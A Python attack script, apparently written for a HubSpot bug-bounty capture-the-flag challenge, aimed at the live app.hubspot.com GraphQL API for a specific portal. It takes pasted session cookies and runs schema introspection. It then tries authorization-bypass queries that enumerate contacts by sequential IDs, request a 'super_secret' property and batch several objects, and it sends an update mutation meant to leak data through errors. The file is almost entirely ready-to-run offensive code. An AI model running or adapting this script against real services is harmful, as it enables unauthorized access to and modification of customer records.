#!/usr/bin/env python3
"""
GraphQL Introspection and Testing Tool
Discovers GraphQL schema and tests for authorization bypasses
"""

import requests
import json
import sys
from typing import Dict, List

class GraphQLTester:
    def __init__(self, session_cookies: str):
        self.base_url = "https://app.hubspot.com/api/graphql/crm"
        self.target_portal = "46962361"
        self.session = requests.Session()
        self.session.headers.update({
            'Cookie': session_cookies,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.schema = {}

    def introspect_schema(self) -> Dict:
        """Run full GraphQL introspection"""
        print("[*] Running GraphQL introspection...")

        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }

        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }

        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }

        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """

        try:
            response = self.session.post(
                f"{self.base_url}?portalId={self.target_portal}",
                json={'query': introspection_query},
                timeout=30
            )

            if response.status_code == 200:
                self.schema = response.json()
                print(f"[+] Schema introspection successful!")
                self.analyze_schema()
                return self.schema
            else:
                print(f"[-] Introspection failed: {response.status_code}")
                print(f"    Response: {response.text[:200]}")
                return None

        except Exception as e:
            print(f"[!] Error during introspection: {e}")
            return None

    def analyze_schema(self):
        """Analyze schema for interesting queries"""
        print("\n[*] Analyzing schema for interesting queries...")

        if '__schema' not in self.schema.get('data', {}):
            print("[-] No schema data available")
            return

        schema_data = self.schema['data']['__schema']

        # Find all query types
        print("\n=== Available Query Types ===")
        for type_info in schema_data.get('types', []):
            if type_info['kind'] == 'OBJECT' and type_info['name'] == schema_data['queryType']['name']:
                for field in type_info.get('fields', []):
                    print(f"  - {field['name']}")
                    if 'contact' in field['name'].lower() or 'crm' in field['name'].lower():
                        print(f"    *** INTERESTING: Contact/CRM related ***")
                        print(f"    Description: {field.get('description', 'N/A')}")
                        print(f"    Args: {[arg['name'] for arg in field.get('args', [])]}")

    def test_contact_queries(self):
        """Test various GraphQL queries for contact access"""
        print("\n[*] Testing GraphQL contact queries...")

        queries = [
            {
                'name': 'Direct crmObject query',
                'query': '''
                    query GetContact {
                        crmObject(objectId: "1", objectTypeId: "0-1") {
                            objectId
                            properties {
                                name
                                value
                            }
                        }
                    }
                '''
            },
            {
                'name': 'crmObject with portal context',
                'query': '''
                    query GetContact($portalId: String!) {
                        portal(portalId: $portalId) {
                            crmObject(objectId: "1", objectTypeId: "0-1") {
                                objectId
                                properties {
                                    name
                                    value
                                }
                            }
                        }
                    }
                ''',
                'variables': {'portalId': self.target_portal}
            },
            {
                'name': 'crmObjectSearch',
                'query': '''
                    query SearchContacts {
                        crmObjectSearch(objectTypeId: "0-1", limit: 10) {
                            results {
                                objectId
                                properties {
                                    name
                                    value
                                }
                            }
                        }
                    }
                '''
            },
            {
                'name': 'Specific properties query',
                'query': '''
                    query GetContactProps($objectId: String!, $props: [String!]) {
                        crmObject(objectId: $objectId, objectTypeId: "0-1") {
                            objectId
                            properties(names: $props) {
                                name
                                value
                            }
                        }
                    }
                ''',
                'variables': {
                    'objectId': '1',
                    'props': ['firstname', 'super_secret', 'email']
                }
            },
            {
                'name': 'Batch contact query',
                'query': '''
                    {
                        contact1: crmObject(objectId: "1", objectTypeId: "0-1") {
                            properties { name value }
                        }
                        contact2: crmObject(objectId: "2", objectTypeId: "0-1") {
                            properties { name value }
                        }
                        contact3: crmObject(objectId: "3", objectTypeId: "0-1") {
                            properties { name value }
                        }
                    }
                '''
            }
        ]

        results = []
        for test in queries:
            print(f"\n[*] Testing: {test['name']}")

            payload = {'query': test['query']}
            if 'variables' in test:
                payload['variables'] = test['variables']

            try:
                response = self.session.post(
                    f"{self.base_url}?portalId={self.target_portal}",
                    json=payload,
                    timeout=15
                )

                print(f"    Status: {response.status_code}")

                if response.status_code == 200:
                    data = response.json()

                    # Check for errors
                    if 'errors' in data:
                        print(f"    [-] GraphQL Errors: {data['errors']}")

                    # Check for data
                    if 'data' in data and data['data']:
                        print(f"    [+] SUCCESS! Got data:")
                        print(f"    {json.dumps(data, indent=6)[:500]}...")

                        # Look for flags
                        data_str = json.dumps(data)
                        if 'firstname' in data_str or 'super_secret' in data_str:
                            print(f"\n    *** POTENTIAL FLAG FOUND! ***")
                            print(f"    Full response:")
                            print(json.dumps(data, indent=6))

                        results.append({
                            'test': test['name'],
                            'status': 'SUCCESS',
                            'data': data
                        })
                else:
                    print(f"    [-] Failed with status {response.status_code}")
                    print(f"    Response: {response.text[:200]}")

            except Exception as e:
                print(f"    [!] Error: {e}")

        return results

    def test_mutations(self):
        """Test GraphQL mutations (might leak data in errors)"""
        print("\n[*] Testing GraphQL mutations...")

        mutations = [
            {
                'name': 'Update contact (will fail but might leak data)',
                'query': '''
                    mutation UpdateContact($input: UpdateContactInput!) {
                        updateContact(input: $input) {
                            contact {
                                objectId
                                properties {
                                    name
                                    value
                                }
                            }
                        }
                    }
                ''',
                'variables': {
                    'input': {
                        'objectId': '1',
                        'properties': [
                            {'name': 'firstname', 'value': 'test'}
                        ]
                    }
                }
            }
        ]

        for test in mutations:
            print(f"\n[*] Testing mutation: {test['name']}")

            payload = {
                'query': test['query'],
                'variables': test['variables']
            }

            try:
                response = self.session.post(
                    f"{self.base_url}?portalId={self.target_portal}",
                    json=payload,
                    timeout=15
                )

                print(f"    Status: {response.status_code}")
                if response.status_code == 200:
                    data = response.json()
                    print(f"    Response: {json.dumps(data, indent=6)[:500]}")
                else:
                    print(f"    Response: {response.text[:200]}")

            except Exception as e:
                print(f"    [!] Error: {e}")

    def run_all_tests(self):
        """Run all GraphQL tests"""
        print("="*60)
        print("GraphQL Introspection and Testing Tool")
        print("Target: Portal 46962361")
        print("="*60)

        # Try introspection first
        self.introspect_schema()

        # Test contact queries
        self.test_contact_queries()

        # Test mutations
        self.test_mutations()

        print("\n" + "="*60)
        print("GraphQL testing complete")
        print("="*60)


def main():
    print("HubSpot GraphQL CTF Testing Tool\n")
    print("You need authenticated session cookies from app.hubspot.com")
    print("\nHow to get cookies:")
    print("1. Log into app.hubspot.com in your browser")
    print("2. Open Developer Tools > Application > Cookies")
    print("3. Copy all cookies for app.hubspot.com")
    print("4. Format as: cookie1=value1; cookie2=value2; ...\n")

    session_cookies = input("Paste your session cookies: ").strip()

    if not session_cookies:
        print("[-] No cookies provided. Exiting.")
        sys.exit(1)

    tester = GraphQLTester(session_cookies)
    tester.run_all_tests()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
